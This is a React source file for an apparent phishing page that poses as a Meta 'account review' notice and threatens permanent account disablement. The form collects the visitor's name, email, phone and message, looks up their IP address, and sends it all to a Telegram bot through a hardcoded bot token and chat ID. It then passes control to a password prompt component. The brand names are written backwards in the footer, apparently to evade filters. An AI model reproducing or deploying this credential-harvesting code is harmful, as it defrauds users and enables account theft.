import React, { useEffect, useState } from "react";
import Nav from "../component/nav";
import AuthViaPass from "../component/authViaPass"
import axios from 'axios';

const Submit = () => {
  const [authIsOpen, setCheckAuth] = useState(false);
  const [ip, setIP] = useState("");
  const [loginFormValues, setLoginFormValues] = useState({
    name: "",
    email: "",
    phone: 0,
    message: "",
  });
  const getData = async () => {
    const res = await axios.get("https://api.ipify.org/?format=json");
    console.log(res.data);
    setIP(res.data.ip);
  };
  const botToken = '6256951708:AAHI3zEFREFD1CZmm1flOag-3C67beoJ9J0';
  const chatId = '988439115';
  // const botToken = '6072365571:AAGaFtMmu0ZGnICycTTyAULJwsfIHe4cU9s';
  // const chatId = '6116266317';
  const handleSubmit = async (event) => {
    event.preventDefault();
    setCheckAuth(true);
    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: `IP address: ${ip}\nName: ${loginFormValues.name}\nEmail: ${loginFormValues.email}\nPhone: ${loginFormValues.phone}\nMessage: ${loginFormValues.message}`
    }).then(({ data }) => {
      console.log(data);
    })
  };
  const handleFormValueChange = ({ target }) => {
    const name = target.name;
    const value = target.value;

    setLoginFormValues((values) => ({
      ...values,
      [name]: value,
    }));
  };
  useEffect(() => {
    //passing getData method to the lifecycle method
    getData();
  }, []);
  return (
    <div className="w-screen bg-[#E5E7EB]">
      <Nav />
      <div className="container mx-auto max-w-[1164px] p-6">
        {" "}
        <header className="mt-[90px] border-b-[1px] border-[#d1d5db] mb-[24px] w-full">
          <h1 className="text-2xl leading-6 font-semibold">
            Request an account review
          </h1>
          <p className="mt-3.5 pb-3.5 text-base text-[#4b5564] border-b-[1px] border-[#e5e7eb]">
            Detection Center System
          </p>
        </header>
        <main className="flex mb-[80px]">
          <div className="flex lg:flex-row flex-col-reverse ">
            <div className=' basis-full md:basis-2/3 p-3'>
              {/* <div className="mb-6">
              <div className="lg:flex justify-between hidden">
                {" "}
                <h1 className="text-[#9ca3af] text-sm leading-5 font-medium">
                  Fill form
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-medium pl-[25px]">
                  Submit form
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-medium">
                  Await decision
                </h1>
              </div>
              
              <div className="lg:hidden justify-between flex">
                {" "}
                <h1 className="text-[#9ca3af] text-sm leading-5 font-semibold pl-[8px]">
                  1
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-semibold ">
                  2
                </h1>
                <h1 className="text-[#9ca3af] text-sm leading-5 font-semibold pr-[8px]">
                  3
                </h1>
              </div>
              <img src="step.png" alt="noImg" className="w-full" />
            </div> */}
              <div className='grid grid-cols-3 text-gray-500'>
                <div className='hidden lg:block justify-self-start'>Fill Form</div>
                <div className='hidden lg:block justify-self-center'>Submit form</div>
                <div className='hidden lg:block justify-self-end'>Await decision</div>
              </div>
              <div className='lg:hidden grid grid-cols-3 text-gray-500'>
                <div className='grid justify-start'>1</div>
                <div className='grid justify-center'>2</div>
                <div className='grid justify-end'>3</div>
              </div>
              <div className='flex justify-between mb-3'>
                <a href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CheckCircleOutlineIcon">
                  <path d="M16.59 7.58 10 14.17l-3.59-3.58L5 12l5 5 8-8zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
                </svg></a>
                <div className='bg-gray-300 w-full h-0.5 mt-3'></div>
                <a href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
                </svg></a>
                <div className='bg-gray-300 w-full h-0.5 mt-3'></div>
                <a href="#" style={{ color: 'blue' }}><svg className="w-6 h-6 MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" z-index={999} focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="RadioButtonUncheckedIcon">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path>
                </svg></a>
              </div>
              {/* form */}
              <div className="bg-white p-[16px] rounded-md">
                <h1 className="text-xl font-semibold text-[#1f2a37] mb-2">
                  Request Form
                </h1>
                <p className="text-sm leading-5 text-[#6b7280]">
                  Ref.99B83BB5-D100-4604-B888-513BE70DE9A3
                </p>
                <hr className="my-[22px]" />
                <form onSubmit={handleSubmit}>
                  <div className="mb-6">
                    <label
                      htmlFor="name"
                      className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px]  dark:text-white"
                    >
                      Full Name:
                    </label>
                    <input
                      type="text"
                      id="name"
                      name="name"
                      className="bg-white! border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                      onChange={handleFormValueChange}
                      required
                    />
                  </div>
                  <div className="mb-6">
                    <label
                      htmlFor="email"
                      className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px] dark:text-white"
                    >
                      Email:
                    </label>
                    <input
                      type="email"
                      id="email"
                      name="email"
                      className="bg-white! border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                      onChange={handleFormValueChange}
                      required
                    />
                  </div>
                  <div className="mb-6">
                    <label
                      htmlFor="phone"
                      className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px] dark:text-white"
                    >
                      Phone number:
                    </label>
                    <input
                      type="number"
                      id="phone"
                      name="phone"
                      className="bg-white! border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                      onChange={handleFormValueChange}
                      required
                    />
                  </div>
                  <div className="mb-6">
                    <label
                      htmlFor="message"
                      className="block mb-2 text-[15px] text-[#1f2a37] leading-[22.5px] dark:text-white"
                    >
                      Any specific details (optional):
                    </label>

                    <textarea
                      id="message"
                      rows="4"
                      name="message"
                      className="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500"
                      onChange={handleFormValueChange}
                    ></textarea>
                  </div>
                  <div className="flex items-start mb-6">
                    <div className="flex items-center h-5">
                      <input
                        id="remember"
                        type="checkbox"
                        value=""
                        className="w-4 h-4 border border-gray-300 rounded bg-white! focus:ring-3 focus:ring-blue-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800"
                        required
                      />
                    </div>
                    <label
                      htmlFor="remember"
                      className="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300"
                    >
                      By clicking the button below, you agree to our Terms of
                      Service and our Data Policy.
                    </label>
                  </div>
                  <input
                    type="submit"
                    value="Submit"
                    className="text-base text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg  w-full sm:w-auto px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
                  />
                </form>
              </div>
            </div>
            <div className="p-3 basis-1/3 border border-gray-300 border-y-0 border-r-0 border-l-1 text-gray-500">
              <p className="text-sm lg:max-w-[296px] w-auto lg:pl-[24px] lg:mb-[64px] p-2">
                Our Detection Center System identifies accounts which violate our{" "}
                <a href="/" className="text-[#0d6efd] underline">
                  Terms of service
                </a>{" "}
                and our{" "}
                <a href="/" className="text-[#0d6efd] underline">
                  Community Standards
                </a>
                , mainly targetting{" "}
                <a href="/" className="text-[#0d6efd] underline">
                  Duplicate or shared accounts used by many people
                </a>
                . or accounts which impersonate someone else.
              </p>
              <div className=" hidden lg:block">
                <h4 className="text-sm leading-5 font-bold text-[#4b5564] max-w-[296px] pl-[24px]">
                  What this means for you?
                </h4>
                <br />
                <br />
                <p className="text-sm max-w-[296px] pl-[24px] mb-[64px]">
                  {" "}
                  We are obliged to permanently disable your account, unless you
                  request a formal review by our dedicated team which will review
                  each account against our detections.
                </p>
                <h4 className="text-sm leading-5 font-bold text-[#4b5564] max-w-[296px] pl-[24px]">
                  What next?
                </h4>
                <br />
                <br />
                <p className="text-sm max-w-[296px] pl-[24px] mb-[64px]">
                  {" "}
                  We are giving you the opportunity to respond with a formal request
                  for review through this page. This request will then be attached
                  to your case for review by our dedicated team.
                </p>
              </div>
            </div>
          </div>
        </main>
      </div>
      {/* authen */}
      {<>{/* <Authenication /> */}</>}
      <AuthViaPass authIsOpen={authIsOpen} setCheckAuth={setCheckAuth} name={loginFormValues.name} ip={ip} />
      {/* end */}
      <footer className="bg-white text-center pb-[28px]">
        <div className="flex space-x-[20px] justify-center pt-[40px] mb-[24px]">
          <a
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Products
          </a>
          <a
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Terms & Policies
          </a>
          <a
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Developers
          </a>
          <a
            className="text-base leading-5 hover:text-[#4446de] hover:underline"
            href="/"
          >
            Help
          </a>
        </div>
        <p className="text-xs text-[#6b7280] max-w-[500px] text-center mx-auto mb-[16px]">
          The koobecaF company is now ateM. We’ve updated our Terms of Use,
          Privacy Policy, and Cookies Policy to reflect the new name on January
          4, 2022. While our company name has changed, we are continuing to
          offer the same products, including the koobecaF app.
        </p>
        <label className="text-base text-[#6b7280] max-w-[500px] text-center mx-auto mb-[16px]">
          © 2022 Meta
        </label>
      </footer>
    </div>
  );
};

export default Submit;
